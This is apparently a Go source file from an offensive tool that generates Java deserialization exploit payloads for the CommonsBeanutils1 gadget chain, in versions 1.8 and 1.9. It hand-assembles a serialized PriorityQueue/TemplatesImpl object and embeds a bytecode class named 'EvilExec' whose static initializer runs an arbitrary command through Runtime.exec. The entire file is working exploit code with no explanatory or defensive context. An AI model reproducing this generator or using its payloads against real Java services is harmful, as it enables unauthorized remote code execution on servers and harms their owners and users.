package payload

import (
	"encoding/binary"
)

var (
	IExecManager ExecManager
)

type ExecManager struct {
	dict map[string]*ExecWrapper
}

type ExecWrapper struct {
	f    func(string) []byte
	name string
}

func (m *ExecManager) Set(name string, f func(string) []byte) {
	m.dict[name] = &ExecWrapper{f: f, name: name}
}

func (m *ExecManager) Get(name string) (*ExecWrapper, bool) {
	if gadget, ok := m.dict[name]; ok {
		return gadget, ok
	}
	return nil, false
}

func (w *ExecWrapper) Exec(command string) []byte {
	return w.f(command)
}

func (w *ExecWrapper) Name() string {
	return w.name
}

func init() {
	IExecManager.dict = make(map[string]*ExecWrapper)
	IExecManager.Set("cb1v18", commonsBeanutils1v18)
	IExecManager.Set("cb1v19", commonsBeanutils1v19)
}

func commonsBeanutils1v18(command string) []byte {
	var (
		prefix  = []byte("\xac\xed\x00\x05sr\x00\x17java.util.PriorityQueue\x94\xda0\xb4\xfb?\x82\xb1\x03\x00\x02I\x00\x04sizeL\x00\ncomparatort\x00\x16Ljava/util/Comparator;xp\x00\x00\x00\x02sr\x00+org.apache.commons.beanutils.BeanComparator")
		uid     = []byte("\xcf\x8e\x01\x82\xfeN\xf1~")
		midfix  = []byte("\x02\x00\x02L\x00\ncomparatorq\x00~\x00\x01L\x00\x08propertyt\x00\x12Ljava/lang/String;xpsr\x00*java.lang.String$CaseInsensitiveComparatorw\x03\\}\\P\xe5\xce\x02\x00\x00xpt\x00\x10outputPropertiesw\x04\x00\x00\x00\x03sr\x00:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\tWO\xc1n\xac\xab3\x03\x00\x06I\x00\r_indentNumberI\x00\x0e_transletIndex[\x00\n_bytecodest\x00\x03[[B[\x00\x06_classt\x00\x12[Ljava/lang/Class;L\x00\x05_nameq\x00~\x00\x04L\x00\x11_outputPropertiest\x00\x16Ljava/util/Properties;xp\x00\x00\x00\x00\xff\xff\xff\xffur\x00\x03[[BK\xfd\x19\x15gg\xdb7\x02\x00\x00xp\x00\x00\x00\x01ur\x00\x02[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\x00\x00xp")
		postfix = []byte("pt\x00\x00pw\x01\x00xsr\x00\x11java.lang.Integer\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x00\x01x")
	)
	buf := make([]byte, 0)
	buf = append(postfix, buf...)

	template := exec(command)
	buf = append(template, buf...)

	buf = append(make([]byte, 4), buf...)
	binary.BigEndian.PutUint32(buf, uint32(len(template)))

	buf = append(midfix, buf...)
	buf = append(uid, buf...)
	buf = append(prefix, buf...)
	return buf
}

func commonsBeanutils1v19(command string) []byte {
	var (
		prefix  = []byte("\xac\xed\x00\x05sr\x00\x17java.util.PriorityQueue\x94\xda0\xb4\xfb?\x82\xb1\x03\x00\x02I\x00\x04sizeL\x00\ncomparatort\x00\x16Ljava/util/Comparator;xp\x00\x00\x00\x02sr\x00+org.apache.commons.beanutils.BeanComparator")
		uid     = []byte("\xe3\xa1\x88\xeas\"\xa4H")
		midfix  = []byte("\x02\x00\x02L\x00\ncomparatorq\x00~\x00\x01L\x00\x08propertyt\x00\x12Ljava/lang/String;xpsr\x00*java.lang.String$CaseInsensitiveComparatorw\x03\\}\\P\xe5\xce\x02\x00\x00xpt\x00\x10outputPropertiesw\x04\x00\x00\x00\x03sr\x00:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\tWO\xc1n\xac\xab3\x03\x00\x06I\x00\r_indentNumberI\x00\x0e_transletIndex[\x00\n_bytecodest\x00\x03[[B[\x00\x06_classt\x00\x12[Ljava/lang/Class;L\x00\x05_nameq\x00~\x00\x04L\x00\x11_outputPropertiest\x00\x16Ljava/util/Properties;xp\x00\x00\x00\x00\xff\xff\xff\xffur\x00\x03[[BK\xfd\x19\x15gg\xdb7\x02\x00\x00xp\x00\x00\x00\x01ur\x00\x02[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\x00\x00xp")
		postfix = []byte("pt\x00\x00pw\x01\x00xsr\x00\x11java.lang.Integer\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x00\x01x")
	)
	buf := make([]byte, 0)
	buf = append(postfix, buf...)

	template := exec(command)
	buf = append(template, buf...)

	buf = append(make([]byte, 4), buf...)
	binary.BigEndian.PutUint32(buf, uint32(len(template)))

	buf = append(midfix, buf...)
	buf = append(uid, buf...)
	buf = append(prefix, buf...)
	return buf
}

func exec(command string) []byte {
	var (
		prefix  = []byte("\xca\xfe\xba\xbe\x00\x00\x004\x00\x1c\x01\x00\x08EvilExec\x07\x00\x01\x01\x00\x10java/lang/Object\x07\x00\x03\x01\x00\nSourceFile\x01\x00\rEvilExec.java\x01\x00@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet\x07\x00\x07\x01\x00\x08<clinit>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x11java/lang/Runtime\x07\x00\x0c\x01\x00\ngetRuntime\x01\x00\x15()Ljava/lang/Runtime;\x0c\x00\x0e\x00\x0f\n\x00\r\x00\x10\x01")
		postfix = []byte("\x08\x00\x12\x01\x00\x04exec\x01\x00'(Ljava/lang/String;)Ljava/lang/Process;\x0c\x00\x14\x00\x15\n\x00\r\x00\x16\x01\x00\rStackMapTable\x01\x00\x06<init>\x0c\x00\x19\x00\n\n\x00\x08\x00\x1a\x00!\x00\x02\x00\x08\x00\x00\x00\x00\x00\x02\x00\x08\x00\t\x00\n\x00\x01\x00\x0b\x00\x00\x00$\x00\x03\x00\x02\x00\x00\x00\x0f\xa7\x00\x03\x01L\xb8\x00\x11\x12\x13\xb6\x00\x17W\xb1\x00\x00\x00\x01\x00\x18\x00\x00\x00\x03\x00\x01\x03\x00\x01\x00\x19\x00\n\x00\x01\x00\x0b\x00\x00\x00\x11\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x1b\xb1\x00\x00\x00\x00\x00\x01\x00\x05\x00\x00\x00\x02\x00\x06")
	)
	buf := make([]byte, 0)
	buf = append(postfix, buf...)

	buf = append([]byte(command), buf...)

	buf = append(make([]byte, 2), buf...)
	binary.BigEndian.PutUint16(buf, uint16(len(command)))

	buf = append(prefix, buf...)

	return buf
}
